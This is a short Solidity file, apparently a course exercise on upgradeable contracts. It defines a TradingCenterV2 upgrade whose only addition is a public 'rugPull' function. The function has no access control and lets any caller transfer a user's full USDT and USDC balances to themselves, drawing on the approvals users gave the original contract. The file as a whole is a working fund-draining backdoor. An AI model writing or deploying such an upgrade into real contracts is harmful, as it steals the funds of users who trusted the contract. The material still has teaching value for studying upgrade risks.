// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter } from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    function rugPull(address user) external {
        usdt.transferFrom(user, msg.sender, usdt.balanceOf(user));
        usdc.transferFrom(user, msg.sender, usdc.balanceOf(user));
    }
}